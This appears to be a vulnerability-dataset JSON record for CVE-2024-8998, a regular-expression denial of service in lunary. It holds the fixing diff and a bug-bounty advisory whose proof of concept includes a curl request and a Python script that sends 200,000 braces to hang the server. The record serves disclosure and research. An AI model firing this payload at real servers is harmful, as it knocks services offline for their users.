{
    "CVE-2024-8998": {
        "published_date": "2025-03-20T10:11:04.121Z",
        "patch_commits": [
            {
                "url": "https://github.com/lunary-ai/lunary/commit/f2bfa036caf2c48686474f4560a9c5abcf5f43b7",
                "content": "fix: redos (#562)\n\nFilename: package-lock.json:\n```\n\n```\n\nFilename: packages/backend/src/checks/index.ts:\n```\n@@ -280,7 +280,6 @@\nexport const CHECK_RUNNERS: CheckRunner[] = [\n     evaluator: async (run, params) => {\n       const { regex, type, field } = params;\n \n-      // Use RE2 instead of RegExp for safer regex execution\n       const re = new RE2(regex);\n \n       const runField =\n\n@@ -322,7 +321,7 @@\nexport const CHECK_RUNNERS: CheckRunner[] = [\n           passed = false;\n         } catch (e) {}\n       } else if (type === \"contains\") {\n-        const regex = /{.*?}/gs; // Non-greedy match on anything between {}\n+        const regex = new RE2(/{.*?}/g);\n         const matches = fieldText.match(regex);\n         if (matches) {\n           passed = matches.some((match) => {\n```"
            }
        ],
        "sw_version": "v1.4.25",
        "sw_version_wget": "https://github.com/lunary-ai/lunary/archive/refs/tags/v1.4.25.zip",
        "description": "A Regular Expression Denial of Service (ReDoS) vulnerability exists in lunary-ai/lunary version git f07a845. The server uses the regex /{.*?}/ to match user-controlled strings. In the default JavaScript regex engine, this regex can take polynomial time to match certain crafted user inputs. As a result, an attacker can cause the server to hang for an arbitrary amount of time by submitting a specially crafted payload. This issue is fixed in version 1.4.26.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/4dbd8648-1dca-4f95-b74f-978ef030e97e",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nRedos (Regular Expression Denial of Service) in lunary-ai/lunary\nValid\nReported on Sep 18th 2024\nDescription\nIn lunary, server use regex /{.*?}/ to match user controlled string.\nconst regex = /{.*?}/gs; // Non-greedy match on anything between {}\nconst matches = fieldText.match(regex);\nIn javascript default regex engine, this regexp will take 2nd polynomial time matching some crafted user input. So if user upload some crafted payload, since javascript is single threaded, the server will DOS for abitrary long time.\nProof of Concept\nregister a new user to exploit the vulnerability. Since lunary is a open for register software, anyone that can connect to the server can register a user.\ncreate a json checklist. This is needed for further data flow the regexp dos.\ncurl -X POST \"http://localhost:3333/v1/checklists?projectId=96b5f97b-daee-4dba-bc8c-4e4423c84710\" \\\n     -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2YzJkMTI4My1iODc3LTQzMzctOWY3NS0wMzExM2YwZmQyMTQiLCJlbWFpbCI6Im9pY3UxOTg5MDYxOUAxNjMuY29tIiwib3JnSWQiOiJiNTlhMmNlNS1lNDI1LTRjMmMtYTkwYy03MWExNmYxM2QzZTciLCJleHAiOjE3Mjg1NTA3NjMsImlhdCI6MTcyNTk1ODc2MywibmJmIjoxNzI1OTU4NzYzfQ.tLeCILp7W2VsLrJGU_DGAYbkqEftYbbunAoTopWKiZQ\" \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"slug\":11,\"type\":\"json\",\"data\":[\"AND\",{\"id\":\"json\",\"params\":{\"type\":\"contains\",\"field\":\"input\"}}]}'\ncraft a payload for server to regex match.\nimport requests\nnum_braces = 200000\nmessage_content = '{\"name\":\"a\",\"checklist\":\"11\",\"input\":\"'+'{'*num_braces+'\",\"output\":\"hello oicu\"}'\nurl = \"http://localhost:3333/v1/evaluations/run?projectId=96b5f97b-daee-4dba-bc8c-4e4423c84710\"\nheaders = {\n    \"Authorization\":\"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2YzJkMTI4My1iODc3LTQzMzctOWY3NS0wMzExM2YwZmQyMTQiLCJlbWFpbCI6Im9pY3UxOTg5MDYxOUAxNjMuY29tIiwib3JnSWQiOiJiNTlhMmNlNS1lNDI1LTRjMmMtYTkwYy03MWExNmYxM2QzZTciLCJleHAiOjE3Mjg1NTA3NjMsImlhdCI6MTcyNTk1ODc2MywibmJmIjoxNzI1OTU4NzYzfQ.tLeCILp7W2VsLrJGU_DGAYbkqEftYbbunAoTopWKiZQ\",\n    \"Content-Type\": \"application/json\"\n}\ndata = message_content\nresponse = requests.post(url, headers=headers, data=data)\nOn my laptop, this payload will cause the server to hang for 5 seconds. double the input size will cause the DOS 4 times longer. So the Redos can block the server arbitrary long time.\nImpact\nthe Redos can block the server arbitrary long time.\nOccurrences\nindex.ts L325-L326\nReferences\nhttps://makenowjust-labs.github.io/recheck/playground/\nWe are processing your report and will contact thelunary-ai/lunary team within 24 hours.8 months ago\nHugues Chocart validated this vulnerability8 months ago\noicu0619has been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-8998assigned to this report.8 months ago\nHugues Chocartmarked this as fixedin 1.4.26with commitf2bfa08 months ago\nHugues Chocarthas been awarded the fix bounty\nindex.ts#L325-L326 has been validated\nWe have sent a warning to the lunary-ai/lunary team to inform them that this report will be published in 48 hours5 months ago\nWe have notified the lunary-ai/lunary maintainers about this report in their weekly follow-up5 months ago\nThis vulnerability has now been published5 months ago\nCVE-2024-8998has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2024-8998\n(Published)\nVulnerability Type\nCWE-1333: Inefficient Regular Expression Complexity\nSeverity\nHigh (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nNpm\nAffected Version\ngit f07a845\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$450\nFix Bounty\n$112.5\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory contains a detailed example demonstrating how to utilize the vulnerability, provide automation scripts, and confirm its effects."
            }
        ],
        "cwe": [
            {
                "id": "CWE-400",
                "value": "CWE-400 Uncontrolled Resource Consumption"
            }
        ]
    }
}